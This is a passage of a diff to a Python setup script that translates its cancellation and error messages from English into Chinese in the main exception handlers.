         sys.exit(1)
 
 
@@ -1717,8 +1717,8 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n\n{Colors.YELLOW}Setup cancelled by user.{Colors.RESET}")
+        print(f"\n\n{Colors.YELLOW}用户已取消初始化。{Colors.RESET}")
         sys.exit(0)
     except Exception as e:
-        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
+        print(f"\n{Colors.RED}错误： {e}{Colors.RESET}")
         sys.exit(1)
